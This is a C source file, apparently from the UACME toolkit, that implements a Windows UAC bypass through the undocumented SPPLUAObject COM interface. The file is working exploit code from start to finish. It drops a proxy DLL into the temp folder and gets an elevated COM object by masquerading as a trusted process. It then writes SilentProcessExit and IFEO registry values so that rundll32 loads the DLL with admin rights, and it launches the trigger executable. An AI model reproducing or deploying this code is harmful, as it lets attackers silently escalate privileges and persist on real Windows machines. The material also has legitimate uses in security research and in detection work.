/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2018
*
*  TITLE:       ENIGMA0X3.C
*
*  VERSION:     2.89
*
*  DATE:        14 June 2018
*
*  Deroko UAC bypass using SPPLUAObject (Software Licensing).
*  Origin https://github.com/deroko/SPPLUAObjectUacBypass
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmxxxRegSetValue
*
* Purpose:
*
* Write to the registry using elevated interface.
*
*/
HRESULT ucmxxxRegSetValue(
    _In_ ISLLUACOM *pInterfaceObject,
    _In_ SSLUA_ROOTKEY RegType,
    _In_ LPWSTR KeyName,
    _In_ LPWSTR ValueName,
    _In_ DWORD dwType,
    _In_ PVOID lpData,
    _In_ ULONG cbData
)
{
    HRESULT    r = E_NOT_SET;
    BSTR       bsRegistryPath, bsRegistryValue;
    SAFEARRAY *psa;
    LPVOID     lpBuffer = NULL;

    ISLLUACOMWin7 *pInterfaceObjectWin7 = (ISLLUACOMWin7*)pInterfaceObject;

    psa = SafeArrayCreateVector(VT_I1, 0, cbData);
    if (psa) {
        SafeArrayAccessData(psa, &lpBuffer);
        RtlCopyMemory(lpBuffer, lpData, cbData);
        SafeArrayUnaccessData(psa);
        bsRegistryPath = SysAllocString(KeyName);
        if (bsRegistryPath) {
            bsRegistryValue = SysAllocString(ValueName);
            if (bsRegistryValue) {

                if (g_ctx.dwBuildNumber < 9200) {
                    r = pInterfaceObjectWin7->lpVtbl->SLLUARegKeySetValue(
                        pInterfaceObjectWin7,
                        RegType,
                        bsRegistryPath,
                        bsRegistryValue,
                        psa,
                        dwType);
                }
                else {
                    r = pInterfaceObject->lpVtbl->SLLUARegKeySetValue(
                        pInterfaceObject,
                        RegType,
                        bsRegistryPath,
                        bsRegistryValue,
                        psa,
                        dwType);
                }
                SysFreeString(bsRegistryValue);
            }
            SysFreeString(bsRegistryPath);
        }
        SafeArrayDestroy(psa);
    }

    return r;
}

/*
* ucmSPPLUAObjectMethod
*
* Purpose:
*
* Bypass UAC using SPPLUAObject undocumented COM interface.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmSPPLUAObjectMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL      bResult = FALSE, bCond = FALSE;
    HRESULT   r = E_FAIL;
    ISLLUACOM *SPPLUAObject = NULL;
    IID       xIID_ISPPLUA;
    CLSID     xCLSID_ISPPLUA;

    DWORD     dwReportingMode = 1;
    DWORD     dwGlobalFlag = 0x200; //FLG_MONITOR_SILENT_PROCESS_EXIT

    SIZE_T    memIO, SkipPrep;

    WCHAR     szBuffer[MAX_PATH * 2];
    LPWSTR    lpszCommandLine;

    do {

        //
        // Drop Fubuki to the %temp% as OskSupport.dll
        //
        _strcpy(szBuffer, g_ctx.szTempDirectory);
        _strcat(szBuffer, OSKSUPPORT_DLL);
        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
            break;

        if (CLSIDFromString(T_CLSID_SPPLUAObject, &xCLSID_ISPPLUA) != NOERROR) {
            break;
        }
        if (IIDFromString(T_IID_SPPLUAObject, &xIID_ISPPLUA) != S_OK) {
            break;
        }

        r = ucmMasqueradedCoGetObjectElevate(
            T_CLSID_SPPLUAObject,
            CLSCTX_LOCAL_SERVER,
            &xIID_ISPPLUA,
            &SPPLUAObject);

        if (r != S_OK)
            break;

        if (SPPLUAObject == NULL) {
            r = E_FAIL;
            break;
        }

        //
        // Build rundll32 command.
        //
        memIO = (2 + _strlen(g_ctx.szSystemDirectory)\
            + _strlen(szBuffer)\
            + _strlen(RUNDLL_EXE_CMD)\
            + _strlen(FUBUKI_DEFAULT_ENTRYPOINTW)) * sizeof(WCHAR);

        lpszCommandLine = supHeapAlloc(memIO);
        if (lpszCommandLine) {

            _strcpy(lpszCommandLine, g_ctx.szSystemDirectory);
            _strcat(lpszCommandLine, RUNDLL_EXE_CMD);
            _strcat(lpszCommandLine, szBuffer);
            _strcat(lpszCommandLine, TEXT(","));
            _strcat(lpszCommandLine, FUBUKI_DEFAULT_ENTRYPOINTW);

            //
            // Write data to the registry.
            //
            SkipPrep = _strlen(T_MACHINE);
            _strcpy(szBuffer, &T_WINDOWS_CURRENT_VERSION[SkipPrep]);
            _strcat(szBuffer, T_SILENT_PROCESS_EXIT);
            _strcat(szBuffer, RRINSTALLER_EXE);

            // 1. MonitorProcess
            r = ucmxxxRegSetValue(SPPLUAObject,
                SSLUA_HKEY_LOCAL_MACHINE,
                szBuffer,
                T_MONITOR_PROCESS,
                REG_SZ,
                (PVOID)lpszCommandLine,
                (ULONG)memIO);

            if (SUCCEEDED(r)) {

                // 2. ReportingMode
                r = ucmxxxRegSetValue(SPPLUAObject,
                    SSLUA_HKEY_LOCAL_MACHINE,
                    szBuffer,
                    T_REPORTING_MODE,
                    REG_DWORD,
                    (PVOID)&dwReportingMode,
                    sizeof(dwReportingMode));

                if (SUCCEEDED(r)) {

                    // 3. IFEO GlobalFlag
                    _strcpy(szBuffer, &T_IFEO[SkipPrep]);
                    _strcat(szBuffer, TEXT("\\"));
                    _strcat(szBuffer, RRINSTALLER_EXE);

                    r = ucmxxxRegSetValue(SPPLUAObject,
                        SSLUA_HKEY_LOCAL_MACHINE,
                        szBuffer,
                        T_GLOBAL_FLAG,
                        REG_DWORD,
                        (PVOID)&dwGlobalFlag,
                        sizeof(dwGlobalFlag));

                    if (SUCCEEDED(r)) {

                        //
                        // Launch trigger app.
                        //
                        _strcpy(szBuffer, g_ctx.szSystemDirectory);
                        _strcat(szBuffer, RRINSTALLER_EXE);
                        bResult = supRunProcess(szBuffer, NULL);
                    }
                }
            }
            supHeapFree(lpszCommandLine);
        }

    } while (bCond);

    if (SPPLUAObject != NULL) {
        SPPLUAObject->lpVtbl->Release(SPPLUAObject);
    }

    return bResult;
}
